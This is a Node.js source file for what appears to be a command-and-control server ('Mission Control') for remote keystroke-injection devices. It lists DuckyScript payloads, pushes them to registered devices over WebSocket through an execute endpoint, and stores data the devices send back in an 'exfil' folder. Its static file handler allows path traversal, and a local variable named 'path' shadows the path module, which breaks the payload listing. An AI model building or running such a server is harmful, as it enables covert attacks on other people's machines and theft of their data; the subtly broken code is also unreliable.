const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const WebSocket = require('ws');

// Configuration
const CONFIG = {
  port: process.env.PORT || 3000,
  devicesFile: './data/devices.json',
  payloadsDir: './payloads',
  exfilDir: './exfil'
};

// Ensure directories exist
['data', 'payloads', 'exfil'].forEach(dir => {
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

// Device registry
let devices = {};
try {
  devices = JSON.parse(fs.readFileSync(CONFIG.devicesFile, 'utf8'));
} catch {
  devices = {};
}

// WebSocket server
const wss = new WebSocket.Server({ port: CONFIG.port + 1 });

wss.on('connection', (ws, req) => {
  const ip = req.socket.remoteAddress;
  console.log(`[WS] Device connected: ${ip}`);
  
  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      handleDeviceMessage(ws, data);
    } catch (e) {
      console.error('[WS] Invalid message:', e.message);
    }
  });
  
  ws.on('close', () => {
    console.log(`[WS] Device disconnected: ${ip}`);
    // Mark device offline
    Object.keys(devices).forEach(id => {
      if (devices[id].ip === ip) devices[id].online = false;
    });
    saveDevices();
  });
});

function handleDeviceMessage(ws, data) {
  switch (data.type) {
    case 'register':
      devices[data.deviceId] = {
        id: data.deviceId,
        name: data.name || 'Unknown',
        ip: data.ip,
        online: true,
        battery: data.battery,
        lastSeen: new Date().toISOString()
      };
      saveDevices();
      broadcast({ type: 'deviceUpdate', devices });
      break;
      
    case 'status':
      if (devices[data.deviceId]) {
        devices[data.deviceId].battery = data.battery;
        devices[data.deviceId].lastSeen = new Date().toISOString();
        saveDevices();
      }
      break;
      
    case 'exfil':
      const filename = `${data.deviceId}_${Date.now()}.json`;
      fs.writeFileSync(path.join(CONFIG.exfilDir, filename), JSON.stringify(data.payload, null, 2));
      console.log(`[EXFIL] Saved: ${filename}`);
      break;
      
    case 'heartbeat':
      if (devices[data.deviceId]) {
        devices[data.deviceId].online = true;
        devices[data.deviceId].lastSeen = new Date().toISOString();
      }
      break;
  }
}

function saveDevices() {
  fs.writeFileSync(CONFIG.devicesFile, JSON.stringify(devices, null, 2));
}

function broadcast(data) {
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(JSON.stringify(data));
    }
  });
}

// REST API
const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }
  
  // API Routes
  if (url.pathname.startsWith('/api/')) {
    handleAPI(req, res, url);
    return;
  }
  
  // Static files
  serveStatic(req, res);
});

function handleAPI(req, res, url) {
  const path = url.pathname.replace('/api/', '');
  const parts = path.split('/');
  
  res.setHeader('Content-Type', 'application/json');
  
  switch (parts[0]) {
    case 'devices':
      if (req.method === 'GET') {
        res.writeHead(200);
        res.end(JSON.stringify(Object.values(devices)));
      }
      break;
      
    case 'payloads':
      if (req.method === 'GET') {
        const payloads = [];
        const walk = (dir) => {
          fs.readdirSync(dir).forEach(f => {
            const p = path.join(dir, f);
            if (fs.statSync(p).isDirectory()) walk(p);
            else if (f.endsWith('.ds')) {
              payloads.push({
                name: f,
                path: p,
                content: fs.readFileSync(p, 'utf8')
              });
            }
          });
        };
        walk(CONFIG.payloadsDir);
        res.writeHead(200);
        res.end(JSON.stringify(payloads));
      }
      break;
      
    case 'execute':
      if (req.method === 'POST') {
        let body = '';
        req.on('data', c => body += c);
        req.on('end', () => {
          const { deviceId, payload } = JSON.parse(body);
          // Send to device via WebSocket
          broadcast({ type: 'execute', deviceId, payload });
          res.writeHead(200);
          res.end(JSON.stringify({ status: 'sent' }));
        });
      }
      break;
      
    case 'exfil':
      if (req.method === 'GET') {
        const files = fs.readdirSync(CONFIG.exfilDir);
        res.writeHead(200);
        res.end(JSON.stringify(files));
      }
      break;
      
    default:
      res.writeHead(404);
      res.end(JSON.stringify({ error: 'Not found' }));
  }
}

function serveStatic(req, res) {
  let file = req.url === '/' ? '/index.html' : req.url;
  const ext = path.extname(file);
  const types = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css' };
  
  fs.readFile('.' + file, (err, data) => {
    if (err) {
      res.writeHead(404);
      res.end('Not found');
    } else {
      res.setHeader('Content-Type', types[ext] || 'text/plain');
      res.writeHead(200);
      res.end(data);
    }
  });
}

server.listen(CONFIG.port, () => {
  console.log(`[SERVER] Mission Control running on port ${CONFIG.port}`);
  console.log(`[WS] WebSocket server on port ${CONFIG.port + 1}`);
});
